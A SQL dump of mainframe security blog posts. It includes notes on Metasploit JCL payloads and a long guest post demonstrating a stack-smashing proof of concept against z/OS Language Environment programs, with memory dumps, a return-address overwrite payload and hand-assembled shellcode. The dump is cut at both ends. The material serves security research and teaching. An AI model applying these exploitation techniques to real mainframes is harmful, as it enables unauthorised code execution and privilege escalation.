those who helped in the prototyping phases (SoF & others noted within the exploit) – and as always, the super helpful folks on the MSF teams. For those of you testing mainframe systems – hopefully it’ll help red teamers with an easy win and start the conversation on securing the big iron.\nThere are more goodies in the queue, so stay tuned!\nPR # 6834 – Authorized FTP JCL exploit for z/OS', 'Exploit Development, Mainframe, Security', 'https://www.bigendiansmalls.com/a-logical-first-step/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (25, 'JCL Scripting for Metasploit-Framework', 'bigendiansmalls', '2016-03-28T21:33:45+00:00', '# update 3/31 – added Reverse Shell JCL – this can be used by any direct-to-JES2 delivery method (e.g. FTP, NJE, etc)\nPR #6737\nIn continuation of adding more mainframe functionality to Metasploit, I’ve built (and am in the process of incorporating) JCL (job control language)-based payloads (and exploits which use them) within the framework.\nOnce these updates are complete, Metasploit users with credentials (or some other type of vulnerability exploit), will be able to submit jobs directly to JES2 via ftp(/s) or NJE (hats off to Soldier of Fortran, for the python prototype of NJE).\nI’ll keep a running tally of the Pull Requests here, along with demonstrations and updates.\nThe first PR is simply a basic JCL cmd payload, that does nothing but submit a job which always returns a code 0 (success).\nPR #6717\nHere’s a screenshot of one of the finished exploit modules that will be submitted for inclusion soon:\nMore to come!', 'Exploit Development, Mainframe, Security', 'https://www.bigendiansmalls.com/jcl-scripting-for-metasploit-framework/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (26, 'My Encryption talk at SHARE', 'bigendiansmalls', '2016-02-24T11:10:08+00:00', 'Here’s a link to the presentation I gave at SHARE 2016 in San Antonio.\n \n \n Share winter 2016 encryption  from bigendiansmalls', 'Cryptography, Mainframe, Security', 'https://www.bigendiansmalls.com/encryption_at_share/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (27, 'Topics on Encryption –  SHARE 2016 in San Antonio', 'bigendiansmalls', '2016-02-08T09:02:53+00:00', 'I’m talking about encryption on Thursday, March 3 at SHARE in San Antonio.  Here’s a preview:\nDescription\nEnterprise security has always been concerned with password protection and storage encryption. These two areas make up a large portion of the IT risk portfolio. In this talk the speaker will discuss both of these areas of interest as they apply to z/OS and the mainframe:\n\nWe will review the recent updates to the RACF password hashing algorithm; comparing and contrasting between the legacy (DES) and current (KDFAES – Key Derivation Function with AES256) algorithms by looking at practical application of open source password cracking tools against RACF.\nWe will provide an in depth review of self-encrypting drive technologies as potential risk mitigation mechanisms, discussing the benefits of of using this technology as well as providing other mitigation techniques which better secure your data from prying eyes.\n\nAttendees will come away with a richer understanding of the RACF hashing algorithms and better understand the risk and rewards of full disk encryption.\nSHARE.org San Antonio', 'Cryptography, Mainframe, Security', 'https://www.bigendiansmalls.com/topics-on-encryption-come-listen-at-share-2016-in-san-antonio/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (28, 'Smashing the z/OS LE “Daisy” Chain for Fun and Cease and Desist letters (GUEST POST)', 'bigendiansmalls', '2016-01-08T09:18:30+00:00', 'The following is a cross-post from REDDIT, reposted here with permission from the author  @_Ciq (twitter)  –  Excellent write-up!!! -BeS\n<Big wall of text trigger warning.>\nOver the past few months I’ve been becoming increasingly interested in the CTF concept; finding (purposely built) flaws in software and exploiting them so that arbitrary code can be executed. Having an IBM mainframe background, I was wondering if a similar exercise could be made for that platform. Considering I only have access to a PL/1 compiler, I set out to see if its calling conventions can be exploited.\nIntroduction.\nA typical security flaw for x86 systems consists of overflowing a buffer that lives on the stack, in order to overlay the piece of memory that contains the return address, which coincidentally also lives on the stack, to change the location that a subroutine will return back to. A good example of these are string buffer overflows, because the programmer carelessly copied a character array without properly checking the size of both.\nWriting over this return address is trivial because a buffer will usually live close to said return address on the stack. This because of the x86 architecture revolving around a stack, and the common calling conventions used in x86 programs.\nThe Language Environment and its workings.\nIBM mainframe programs written in compiled languages (COBOL, PL/1, C/C++, Java) are (since relatively recently) subject to being Language Environment (LE) compliant. Compilers will provide compliance automatically. The LE exists to provide a standardized calling convention, standardize tracing, and standardized debugging.\nLE programs are, despite the z/Architecture not inherently being stack based, reliant on a stack structure. As a prologue to each procedure being executed, it will set up what is called a Dynamic Storage Area (DSA), which ties in with the calling conventions. It contains a couple of things;\n\nA pointer to the DSA of the procedure that called the current DSA’s procedure.\nA pointer to the DSA of the procedure that this DSA’s procedure called. (Optional, IBM compilers ignore this field.)\n[1] A save area where all registers are saved when the current DSA’s procedure calls another procedure.\n[2] A pointer to the next free byte on the stack. This gets set depending on how much storage the procedure needs for stack variables. It is used by any procedure called by this procedure to quickly determine where it can build its DSA.\n\nAnd then some, but these things are the most important for us right now.\n[1] z/Architecture has 16 general purpose registers. Unlike x86, they don’t have physically enforced functions. Everything is convention. The contents of registers can be important to a procedure. Hence upon calling another procedures, the contents of the registers must be saved.\nThere is no CALL assembler instruction in the z/Architecture. A call is compiled to a hard branch. There are several types of branches. A call to a procedure would typically be compiled to a branch with two operands. The register containing the address where to branch to, and the register in which to save the location of the instruction right after the current branch instruction, which serves as a return address for the called procedure (this is very important). There are two calling conventions in the mainframe world; caller saves and callee saves. In LE, the callee saves the registers of the caller, and it does this in the register save area that is in the caller’s DSA (third item in the list above). The caller will restore its register when the callee returns control to the caller.\nFor the sake of materializing this abstract explanation; upon a call-type branch, the address to return to will be saved in register 14.\nIn x86 calling conventions, the stack pointer grows higher and lower by POPing and PUSHing items to it. On z/Architecture, there is a register that is the stack pointer, but only by convention. No one is forcing anyone to use any register as a stack pointer. LE has chosen register 13 to be the stack pointer. You don’t push and pop items to the stack on z/Architecture. On a call, the LE sets the stack pointer (by checking where the next available stack byte is, which was determined at the start of the calling procedure), determines where the next stack frame should start (saved at [2]), and constructs its DSA at the currently set stack pointer. Your stack variables live right after the DSA and are accessed by addressing memory relative to the stack pointer. Typically when you compile a program, the listing will include the offsets of the variables to the beginning of the DSA for each procedure. Notice how this makes it annoying to dynamically allocate stack variables.\nWhen setting up the DSA, a procedure (callee) will keep a pointer of the caller’s DSA, in its own (callee’s) DSA.\nWhen a procedure wants to return to the procedure that called it, it needs an address to return to. As we discussed earlier, that address was originally saved in register 14 when the branch to the callee happened. The callee then proceeded to save all registers (including register 14) in the savearea set up in the caller’s DSA. The callee keeps a pointer to its caller’s DSA. So the callee can perfectly fetch the address it needs to return to. Take away from this that the return address lives on the stack, in proximity to stack variables.\nHow to exploit this?\nOn x86 architecture, string copies will compile to loops of byte moves. On z/Architecture, we can do this with one single assembler instruction; MVC. MVC takes the target location, a length, and a source location. Considering that strings are defined with a fixed length in mainframe programming languages (including PL/1), the compiler is aware of each string’s length at all times. As a result, if you try to assign a 10 byte string in to a 5 byte string, the compiler will do two things. Warn you that you’re doing something silly, and compile to an MVC instruction with length parameter 5, copying only the first half of the 10 byte string. As a result, exploiting string copies simply doesn’t work, because you can’t write exploitable code that way.\nAs a mainframe assembler programmer, I understood this fairly quickly. So I had to find another attack vector. In my limited research in to software vulnerability exploitation, I learned that a typical sign of having found a buffer overflow is when the application crashes. z/Architecture, and S/360 before it, rely heavily on ABENDs (abnormal ends). When an ABEND happens, it is accompanied by a code. One of the most common ABEND codes is S0C1. A S0C1 happens when the CPU is decoding an instruction, but finds that the OPCODE does not exist. Assuming that the IBM compilers are flawless, this almost always means that the program managed to branch to an area of memory containing data, and not instructions. For the times I was called up in the middle of the night to resolve a S0C1, it’s a welcome change that this is exactly what I wanted to happen for once.\nSo what programmer errors usually cause S0C1 ABENDs? Addressing an array with an index larger than it was allocated with. How does this happen? Same way x86 buffer overflows happen, no size checking.\nTake a developer who knows that business rules dictate that no one can have more than 5 checking accounts. In a batch program that lists checking accounts, he has an array in which he loads the current person’s 5 checking accounts. He opens a cursor to the database, and starts fetching rows from the resultset, increasing an integer each time he writes a checking account to the array. Sometime, usually around 3:00 AM, the program will treat a person who somehow managed to open 6 checking accounts. The program tries to store the fetched row at an address that it shouldn’t, and sooner or later, the application breaks. S0C1.\nNow that’s still pretty far from an exploit. But; we found that stack variables live close to return addresses on the stack, and we found that we can write to parts of the stack that we’re not supposed to write to. Good luck opening a 6th checking account which will meaningfully overlay a return address though, that’d be something.\nNow, the LE stack grows upwards (unless forced through options in the LE parameters to do the opposite, which literally no one does, because why?). This is annoying! If we manage to write to an address higher than the highest address of an array, we’re just writing in to uninitialized stack space, that’s not helping us anything.\nThere is still an attack vector though; globally declared arrays. When a program gains control (we’ll call this level 0), it sets up its DSA as if it’s a procedure, and its stack variables go right above it. When a subroutine (level 1) is called from level 0, its DSA lives just above those globally declared stack variables. If we can get a globally declared array to write out of its bounds, it’ll eventually write in to level 1’s DSA.\nWriting in to level 1’s DSA when we’re executing as level 1 doesn’t help us any though. The return address that level 1 returns to lives in the DSA of level 0 (register 14 containing the return address is saved in the caller’s DSA remember?), which lives under the globally declared variables. We can attack any level’s return address higher than level 0’s though. So if we can write out of bounds to a globally declared array from level 2 or higher, we’re golden. Note how a problem can arise as soon as more global variables live between the array we want to abuse, and the DSA we want to attack. If those are critical for a procedure to get to the point where it will return to its caller, it won’t, because they are destroyed when smashing the stack. Unless we put meaningful stuff in there, but this makes things much more complicated.\nThere is an exception to this. When you pass a pointer to an array (that lives somewhere between two level’s DSAs to a higher level procedure as an argument), you effectively extend the scope of that array to that procedure. This case is incredibly rare in the real world, I’d assume, since most PL/1 programmers I know don’t know about procedure arguments, and much less about pointers.\nWorking Proof of Concept.\nSo now to put this in practice.\nWe’re going to use a massively simple PL/1 program. Initially, I wanted to read a file line by line until it reached its end of file status, copying each line to a globally declared array, without bounds checking of course. When there are as many lines in the file as there are lines allocated for the array, we’re fine. But as soon as we add another, we’d be overwriting the DSA of the level 1 procedure. This doesn’t work, I know why (reading a file’s line is a call in itself), but not why (the read file call is a call to a closed source procedure, and I’m pretty sure it needs the complete DSA chain to be intact).\nSo what I do is I read all lines in to an array, then copy the elements of that array one by one in to an array with one element less allocated to it. I cheat twice in this PoC, this is the first. I’m working on a better concept with less cheating, of course.\nFrom here on out it’s basically sitting through debugging sessions, learning offsets within the stack by comparing memory contents with listings, knowing the layout of the DSA, and knowing how a procedure gets its return address.\nTurns out that in order to get a return address, a procedure will get its stack base + offset 0x04, which contains a pointer to its caller’s DSA, and then get that address + offset 0x0C, which is where register 14 (the return address, remember?) was saved during the callee’s prologue.\r\n\r\n		\r\n		\r\n			\r\n			\r\n			\r\n			\nL        r13,4(,r13)   R13 is stack base, aka our DSA location. Load location of caller\'s DSA (our DSA +                         offset 4) in register 13.\r\nL        r14,12(,r13)  R13 is now caller\'s stack base, aka its DSA location. At offset 12 to it, we find                         where register 14 was saved. We load this in to register 14.\r\nLM       r2,r6,28(r13) Restore all of the registers from the savearea.\r\nBALR     r1,r14        Return to the address in register 14, and store the address right after this                              instruction in register 1.       \r\n\r\n			\r\n				\r\n					\r\n				\r\n					12345\r\n				\r\n						L        r13,4(,r13)   R13 is stack base, aka our DSA location. Load location of caller\'s DSA (our DSA +                         offset 4) in register 13.L        r14,12(,r13)  R13 is now caller\'s stack base, aka its DSA location. At offset 12 to it, we find                         where register 14 was saved. We load this in to register 14.LM       r2,r6,28(r13) Restore all of the registers from the savearea.BALR     r1,r14        Return to the address in register 14, and store the address right after this                              instruction in register 1.        \r\n					\r\n				\r\n			\r\n		\r\n\r\nSo we need to craft an overlay that will overwrite offset 0x0C in the DSA to change where the program will branch to when trying to return to that DSA’s procedure.\nIn our example, the stack looks something like this right before we write the 6th element to an array with 5 elements;\r\n\r\n		\r\n		\r\n			\r\n			\r\n			\r\n			\n               0 - 2 -    4 - 6 -    8 - A -    C - E -   =  0-2-4-6-8-A-C-E-  \r\n******************************** TOP OF DATA **********************************\r\n192A6878  ===&gt; A715000D   00160000   C7C8D6E2   E340C9D5  =  x.......GHOST IN  \r\n192A6888  ===&gt; 40E97DE2   40E2C8C5   D3D30A23   00000000  =   Z\'S SHELL......  \r\n192A6898  ===&gt; 00000000   00000000   00000000   00000000  =  ................  \r\n192A68A8  ===&gt; 00000000   00000000   00000000   00000000  =  ................  \r\n192A68B8  ===&gt; 00000000   00000000   00000000   00000000  =  ................  \r\n192A68C8  ===&gt; C2C2C2C2   C2C2C2C2   C2C2C2C2   C2C2C2C2  =  BBBBBBBBBBBBBBBB  \r\n192A68D8  ===&gt; C2C2C2C2   C2C2C2C2   C2C2C2C2   C2C2C2C2  =  BBBBBBBBBBBBBBBB  \r\n192A68E8  ===&gt; C2C2C2C2   C2C2C2C2   C2C2C2C2   C2C2C2C2  =  BBBBBBBBBBBBBBBB  \r\n192A68F8  ===&gt; C2C2C2C2   C2C2C2C2   C2C2C2C2   C2C2C2C2  =  BBBBBBBBBBBBBBBB  \r\n192A6908  ===&gt; C2C2C2C2   C2C2C2C2   C2C2C2C2   C2C2C2C2  =  BBBBBBBBBBBBBBBB  \r\n192A6918  ===&gt; C1C1C1C1   C1C1C1C1   C1C1C1C1   C1C1C1C1  =  AAAAAAAAAAAAAAAA  \r\n192A6928  ===&gt; C1C1C1C1   C1C1C1C1   C1C1C1C1   C1C1C1C1  =  AAAAAAAAAAAAAAAA  \r\n192A6938  ===&gt; C1C1C1C1   C1C1C1C1   C1C1C1C1   C1C1C1C1  =  AAAAAAAAAAAAAAAA  \r\n192A6948  ===&gt; C1C1C1C1   C1C1C1C1   C1C1C1C1   C1C1C1C1  =  AAAAAAAAAAAAAAAA  \r\n192A6958  ===&gt; C1C1C1C1   C1C1C1C1   C1C1C1C1   C1C1C1C1  =  AAAAAAAAAAAAAAAA  \r\n192A6968  ===&gt; C2C2C2C2   C2C2C2C2   C2C2C2C2   C2C2C2C2  =  BBBBBBBBBBBBBBBB  \r\n192A6978  ===&gt; C2C2C2C2   C2C2C2C2   C2C2C2C2   C2C2C2C2  =  BBBBBBBBBBBBBBBB  \r\n192A6988  ===&gt; C2C2C2C2   C2C2C2C2   C2C2C2C2   C2C2C2C2  =  BBBBBBBBBBBBBBBB  \r\n192A6998  ===&gt; C2C2C2C2   C2C2C2C2   C2C2C2C2   C2C2C2C2  =  BBBBBBBBBBBBBBBB  \r\n192A69A8  ===&gt; C2C2C2C2   C2C2C2C2   C2C2C2C2   C2C2C2C2  =  BBBBBBBBBBBBBBBB  \r\n192A69B8  ===&gt; C1C1C1C1   C1C1C1C1   C1C1C1C1   C1C1C1C1  =  AAAAAAAAAAAAAAAA  \r\n192A69C8  ===&gt; C1C1C1C1   C1C1C1C1   C1C1C1C1   C1C1C1C1  =  AAAAAAAAAAAAAAAA  \r\n192A69D8  ===&gt; C1C1C1C1   C1C1C1C1   C1C1C1C1   C1C1C1C1  =  AAAAAAAAAAAAAAAA  \r\n192A69E8  ===&gt; C1C1C1C1   C1C1C1C1   C1C1C1C1   C1C1C1C1  =  AAAAAAAAAAAAAAAA  \r\n192A69F8  ===&gt; C1C1C1C1   C1C1C1C1   C1C1C1C1   C1C1C1C1  =  AAAAAAAAAAAAAAAA  \r\n192A6A08  ===&gt; 187C3150   192A65B8   188DD070   00044040  =  .@.&amp;......}...    \r\n192A6A18  ===&gt; 0020A000   187C35A8   00000000   00000000  =  .....@.y........  \r\n192A6A28  ===&gt; 1929C95C   00048001   00606002   187C35B4  =  ..I*.....--..@..  \r\n192A6A38  ===&gt; 00000000   00000000   10000000   192A65B8  =  ................  \r\n192A6A48  ===&gt; 192A9B38   987C357A   187C31B8   00000080  =  ....q@.:.@......  \r\n192A6A58  ===&gt; 987C340E   192A6B18   187C358C   187C3AF4  =  q@....,..@...@.4  \r\n192A6A68  ===&gt; 192A65B8   187C3A70   187C35A8   18B937F0  =  .....@...@.y...0  \r\n192A6A78  ===&gt; 00000008   00000000   192A6230   18B94BD8  =  ...............Q  \r\n192A6A88  ===&gt; 00000000   192A6B88   18B0C5E0   18B93460  =  ......,h..E\\...-  \r\n192A6A98  ===&gt; 00000000   192A6AC8   192A6AB4   192A62F4  =  ......¦H..¦....4  \r\n192A6AA8  ===&gt; 192A6AB8   9940A388   192A6C98   000015A0  =  ..¦.r th..%q....  \r\n\r\n			\r\n				\r\n					\r\n				\r\n					123456789101112131415161718192021222324252627282930313233343536373839\r\n				\r\n						               0 - 2 -    4 - 6 -    8 - A -    C - E -   =  0-2-4-6-8-A-C-E-  ******************************** TOP OF DATA **********************************192A6878  ===&gt; A715000D   00160000   C7C8D6E2   E340C9D5  =  x.......GHOST IN  192A6888  ===&gt; 40E97DE2   40E2C8C5   D3D30A23   00000000  =   Z\'S SHELL......  192A6898  ===&gt; 00000000   00000000   00000000   00000000  =  ................  192A68A8  ===&gt; 00000000   00000000   00000000   00000000  =  ................  192A68B8  ===&gt; 00000000   00000000   00000000   00000000  =  ................  192A68C8  ===&gt; C2C2C2C2   C2C2C2C2   C2C2C2C2   C2C2C2C2  =  BBBBBBBBBBBBBBBB  192A68D8  ===&gt; C2C2C2C2   C2C2C2C2   C2C2C2C2   C2C2C2C2  =  BBBBBBBBBBBBBBBB  192A68E8  ===&gt; C2C2C2C2   C2C2C2C2   C2C2C2C2   C2C2C2C2  =  BBBBBBBBBBBBBBBB  192A68F8  ===&gt; C2C2C2C2   C2C2C2C2   C2C2C2C2   C2C2C2C2  =  BBBBBBBBBBBBBBBB  192A6908  ===&gt; C2C2C2C2   C2C2C2C2   C2C2C2C2   C2C2C2C2  =  BBBBBBBBBBBBBBBB  192A6918  ===&gt; C1C1C1C1   C1C1C1C1   C1C1C1C1   C1C1C1C1  =  AAAAAAAAAAAAAAAA  192A6928  ===&gt; C1C1C1C1   C1C1C1C1   C1C1C1C1   C1C1C1C1  =  AAAAAAAAAAAAAAAA  192A6938  ===&gt; C1C1C1C1   C1C1C1C1   C1C1C1C1   C1C1C1C1  =  AAAAAAAAAAAAAAAA  192A6948  ===&gt; C1C1C1C1   C1C1C1C1   C1C1C1C1   C1C1C1C1  =  AAAAAAAAAAAAAAAA  192A6958  ===&gt; C1C1C1C1   C1C1C1C1   C1C1C1C1   C1C1C1C1  =  AAAAAAAAAAAAAAAA  192A6968  ===&gt; C2C2C2C2   C2C2C2C2   C2C2C2C2   C2C2C2C2  =  BBBBBBBBBBBBBBBB  192A6978  ===&gt; C2C2C2C2   C2C2C2C2   C2C2C2C2   C2C2C2C2  =  BBBBBBBBBBBBBBBB  192A6988  ===&gt; C2C2C2C2   C2C2C2C2   C2C2C2C2   C2C2C2C2  =  BBBBBBBBBBBBBBBB  192A6998  ===&gt; C2C2C2C2   C2C2C2C2   C2C2C2C2   C2C2C2C2  =  BBBBBBBBBBBBBBBB  192A69A8  ===&gt; C2C2C2C2   C2C2C2C2   C2C2C2C2   C2C2C2C2  =  BBBBBBBBBBBBBBBB  192A69B8  ===&gt; C1C1C1C1   C1C1C1C1   C1C1C1C1   C1C1C1C1  =  AAAAAAAAAAAAAAAA  192A69C8  ===&gt; C1C1C1C1   C1C1C1C1   C1C1C1C1   C1C1C1C1  =  AAAAAAAAAAAAAAAA  192A69D8  ===&gt; C1C1C1C1   C1C1C1C1   C1C1C1C1   C1C1C1C1  =  AAAAAAAAAAAAAAAA  192A69E8  ===&gt; C1C1C1C1   C1C1C1C1   C1C1C1C1   C1C1C1C1  =  AAAAAAAAAAAAAAAA  192A69F8  ===&gt; C1C1C1C1   C1C1C1C1   C1C1C1C1   C1C1C1C1  =  AAAAAAAAAAAAAAAA  192A6A08  ===&gt; 187C3150   192A65B8   188DD070   00044040  =  .@.&amp;......}...    192A6A18  ===&gt; 0020A000   187C35A8   00000000   00000000  =  .....@.y........  192A6A28  ===&gt; 1929C95C   00048001   00606002   187C35B4  =  ..I*.....--..@..  192A6A38  ===&gt; 00000000   00000000   10000000   192A65B8  =  ................  192A6A48  ===&gt; 192A9B38   987C357A   187C31B8   00000080  =  ....q@.:.@......  192A6A58  ===&gt; 987C340E   192A6B18   187C358C   187C3AF4  =  q@....,..@...@.4  192A6A68  ===&gt; 192A65B8   187C3A70   187C35A8   18B937F0  =  .....@...@.y...0  192A6A78  ===&gt; 00000008   00000000   192A6230   18B94BD8  =  ...............Q  192A6A88  ===&gt; 00000000   192A6B88   18B0C5E0   18B93460  =  ......,h..E\\...-  192A6A98  ===&gt; 00000000   192A6AC8   192A6AB4   192A62F4  =  ......¦H..¦....4  192A6AA8  ===&gt; 192A6AB8   9940A388   192A6C98   000015A0  =  ..¦.r th..%q....   \r\n					\r\n				\r\n			\r\n		\r\n\r\nAddress 192A6878 is the location of the first element in the array. It’s also our payload (more about that later). Each element is 80 bytes long, so element 2 starts at 192A68C8, etc etc. The 6th element (for which no allocation was made!) will be written to 192A6A08, which contains garbage. Between the end of the stack variables and the beginning of another DSA exists some padding, since the compiler aligns DSAs in a certain way. The DSA that lives right above this array is level 1’s DSA. It starts at address 192A6A40, I know this because I studied the offsets within a DSA (IBM documents) and the offsets of the stack variables to the stack frame base, which I get from the output listing when compiling the program (you don’t get this in real life). Offset 0x0C to the DSA base is the address that this DSA’s procedure has its callees return to.\nOur payload will be 80 bytes long, because each element in the array is 80 bytes long. We get to inject our payload at 192A6A08, and the memory location we need to overlay is 192A6A4C. That’s at an offset of 68 (decimal), to the beginning of our payload. So our payload looks something like this in EBCDIC (yeah we don’t play with ASCII or UTF too well);\r\n\r\n		\r\n		\r\n			\r\n			\r\n			\r\n			\n        q&lt;N         \r\n\r\n			\r\n				\r\n					\r\n				\r\n					12\r\n				\r\n						        q&lt;N          \r\n					\r\n				\r\n			\r\n		\r\n\r\nHexadecimal it looks like this;\r\n\r\n		\r\n		\r\n			\r\n			\r\n			\r\n			\n00000000000000000000000000000000000000000000000000000000000000000000926700000000\r\n000000000000000000000000000000000000000000000000000000000000000000009A8800000000\r\n\r\n			\r\n				\r\n					\r\n				\r\n					123\r\n				\r\n						00000000000000000000000000000000000000000000000000000000000000000000926700000000000000000000000000000000000000000000000000000000000000000000000000009A8800000000 \r\n					\r\n				\r\n			\r\n		\r\n\r\nNotice how I put a valid (31 bit, it looks like 32 bits) address in the location that will be overlaid over the return address in the caller’s DSA. It’s 992A6878[*], the address of the first element of the array we’re attacking. I conveniently injected executable code on to the stack in this way. I could have put it in any element, including the 6th which overlays the return address. I could’ve also put it in common storage by using another program (z/Architecture memory layout feature), memory that is accessible by every address space.\n* The address shown by the debugger is 192A6878, not 992A6878. The latter address has bit 0 flipped to 1, which indicates (in z/Architecture) that the program is running in 31 bit mode, which is the successor of the 24 bit mode before it. The debugger has problems with this, but the program is in fact running in 31 bit mode, and the address of the executable payload should have bit 0 flipped to 1.\nThis is also the second time I cheat by the way. I can’t easily find the address of our payload, it changes from execution to execution (more about this later). So to make it easy for myself, I print the address of the first element of the array to the spool, from the program itself, effectively telling me where I need to force the program to branch to. No program in the real world will do this for you!\nSo; this payload will make the program branch to our executable payload as soon as any procedure, no matter how many levels deep we are right now, tries to return to level 1.\nSo what’s in our payload?\r\n\r\n		\r\n		\r\n			\r\n			\r\n			\r\n			\nx       GHOST IN Z\'S SHELL                                                      \r\n\r\nA1000100CCDEE4CD4E7E4ECCDD020000000000000000000000000000000000000000000000000000\r\n750D06007862309509D2028533A30000000000000000000000000000000000000000000000000000\r\n\r\n			\r\n				\r\n					\r\n				\r\n					12345\r\n				\r\n						x       GHOST IN Z\'S SHELL                                                       A1000100CCDEE4CD4E7E4ECCDD020000000000000000000000000000000000000000000000000000750D06007862309509D2028533A30000000000000000000000000000000000000000000000000000 \r\n					\r\n				\r\n			\r\n		\r\n\r\nIt’s the machine code (hand)compiled from assembler instructions looking like this;\r\n\r\n		\r\n		\r\n			\r\n			\r\n			\r\n			\nBRAS  1,&lt;symbol&gt;            Branch relative to the current address, save address after this instruction in\r\n                            register 1. We branch forwards 13 halfwords (0xD), or 26 bytes because our\r\n                            parm list is that long.\r\nDC    AL2(6)                Constant of 2 bytes, contents are integer \'6\'. Length of parameters.\r\nDC    B\'0000000000000000\'   Constant of 2 bytes, contents binary zeroes. Parameters for SVC.\r\nDC    C\'GHOST IN Z\'S SHELL\' Constant of 18 bytes, you know the contents. Message to display.\r\nSVC   35                    Make supervisor call 35.\r\n\r\n			\r\n				\r\n					\r\n				\r\n					12345678\r\n				\r\n						BRAS  1,&lt;symbol&gt;            Branch relative to the current address, save address after this instruction in                            register 1. We branch forwards 13 halfwords (0xD), or 26 bytes because our                            parm list is that long.DC    AL2(6)                Constant of 2 bytes, contents are integer \'6\'. Length of parameters.DC    B\'0000000000000000\'   Constant of 2 bytes, contents binary zeroes. Parameters for SVC.DC    C\'GHOST IN Z\'S SHELL\' Constant of 18 bytes, you know the contents. Message to display.SVC   35                    Make supervisor call 35. \r\n					\r\n				\r\n			\r\n		\r\n\r\nSupervisor call 35 wants register 1 to contain a pointer to where its parameters are in memory. The parameters are in between the branch and the supervisor call. By branching over the parameters, straight to the SVC, and saving the address of the parameter list in register 1 by doing so, we accomplish a lot in just one instruction.\nSupervisor call 35 is “Write To Operator”, or WTO. It writes a message to the consoles that are configured to display this particular message. It actually displays it so that’s fun.\nThis is arbitrary code being executed from an LE enabled program running under z/OS on a z/Architecture machine.\nRandom notes and thoughts.\nz/Architecture does not feature executable space protection, nor does it have the possibility to mark memory as non-executable. This makes it very easy for us to inject code. As long as we can get it in memory, we can execute it.\nz/Architecture does not feature ASLR, explicitly. The address at which the array in our PoC lives changes from time to time though. I’ve been doing some documentation digging (which is all I can do because IBM is closed source when it comes to code), and found that the stack is allocated at the start of an LE program with a GETMAIN SVC call (standard stuff). This triggers the Virtual Storage Manager to find an empty piece of memory with the size that was requested, with the characteristics requested. Why, and under what circumstances the VSM decides that another virtual page should be used this execution, as opposed to any other execution, I don’t know yet. I’m afraid I’ll have to reverse engineer parts of the GETMAIN SVC and VSM for that. Or go work for IBM?\n\nz/Architecture features memory protection in the form of protection keys. You can only edit memory that has the same protection key as the address space you’re running it from. Protection keys run from 0-16 and are set when the address space is started. This protects userland programs from fucking up system areas that live in common storage. You cannot change the protection key of your address space*. When you allocate (virtual) memory, that memory is marked with the protection key of the address space that requested it.\nz/Architecture features certain instructions that are protected. You can only run them when your program is compiled to be APF-authorized, and resides in an APF-authorized (z/OS option) library. Userland programs will never be APF authorized. APF authorization allows you to switch from problem state to supervisor state. Supervisor state allows you to change your protection key.\nSince we’re probably only going to find vulnerabilities in userland programs, which aren’t (I hope in all shops) APF-authorized, we won’t be able to completely own the system. But we’ll be able to shit on a lot of stuff regardless.\nIf a vulnerability is found in an APF authorized program, some serious escalation can occur. This was part of the exploit-chain used by Warg to shit on Logica’s (Swedish bank) mainframes. An APF authorized program can create a new SVC. Warg introduced a new SVC which allowed any program to escalate its APF authorization (APF authorization is nothing but a bit in protection key 0 storage, which you can write to from an SVC since those run in key 0, supervisor mode). So any program you run, you can call that SVC and switch it to be APF authorized. This allowed him to hold control over the machine for a very long time, since this is seriously hard to find when you’re trying to protect the system.\n\nConsidering how simple the PoC is, I hope it’s clear that in order to be able to exploit a vulnerability, the planets really need to align. The vuln needs to exist, you need to somehow figure out how to craft the payload (hard if you’re not on the system, and have access to source code, compile listings, and a debugging session), and get the payload on the system. Then, when you have arbitrary code execution, you need to know how the system is set up to do interesting stuff. Open sockets, create files, edit files, delete files, what have you.\n\nI mentioned earlier that it would be interesting to introduce the arbitrary code that we want to execute in to the common storage area, which is accessible by every address space. Address spaces are limited in what they can do based on authorities granted to the user they are started with by RACF. Authorities are for example; what files they have access to, what commands they can execute.\nIf you find a vulnerable program, but fail to inject enough code, you can use another program to inject it in to common storage, get a pointer to it, and then use that pointer as a target address for your exploit. Since the code being run from common storage would run in the address space of the vulnerable program, it’d be running under the user that the vulnerable program was started with. This is potential privilege escalation, as you get to do more stuff than you were originally allowed to do. Note that you first need to be able to log on to the system in order to inject anything in to common storage, which under normal circumstances you shouldn’t be allowed to.\nConclusion.\nSo is it possible to “stack smash”, or “smash the daisy chain” (as I like to call it) of z/OS LE programs? Yes.\nWill you be hard pressed to find a vulnerability? Yes.\nWill you be even more hard pressed to somehow be allowed by business rules to inject something that is executable? Yes. My visa account number is sadly not executable machine code.\nIf you’re reading this because one of your managers is flipping out, I’m sorry.\nFinal note.\nI’m really new at this exploiting stuff, and probably missing a lot of easy things that could make the process of finding and abusing vulnerabilities a lot less complicated. If someone with more experience wants to get in to this, I’d be more than happy to help them get started, because I know I’ll get my return on investment when that person surpasses me and can teach me in return.\nLink to original Reddit post', 'Uncategorized', 'https://www.bigendiansmalls.com/smashing-the-zos-le-daisy-chain-for-fun-and-cease-and-desist-letters-guest-post-2/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (29, 'A (mostly) useful debugger on z/OS', 'bigendiansmalls', '2015-12-23T08:35:08+00:00', 'One item that has eluded me in my continuing quest to dive deeply into z Systems architecture is finding a native (IBM-supplied) assembler debugger/disassembler** on the platform that is fully functional, user-friendly and versatile.\nQuickly I gave up on user-friendly and versatile and settled on trying to find one that was fully functional; simply stated – can execute and sustain integrity through any command in the POP manual. Of the 4 debuggers on the system, or as part of an add-on package, all have major out-of-the box ‘features’ that prevent them from being a worthwhile tool to anyone who has used a modern debugger (Like Immunity, Olly, or even GNU’s gdb).*\nFor this platform, my criteria for fully functional was this:\n\nBe able to debug programs which are link-edited APF-authorized and live in APF authorized libraries.\nDebug programs that switch into and out of supervisor state, and also switch PSW key mask values.\nAllow execution of commands that switch address space control (ASC) modes and manipulate storage in any of the 3 modes.\nDo the rest of the actions a basic debugger would do: set breakpoints, single step, watch variables / registers, examine and change memory, and so on.\n\nThe first 3 are functions unique to the z/Architecture platform, and I would expect at least the 3 z/OS based debuggers to handle (and possibly the one OMVS/USS based one also).   None do.  At least out of the box.  A quick list of the debuggers tried, and their limitations is at the end of this post.\n\nI say “out of 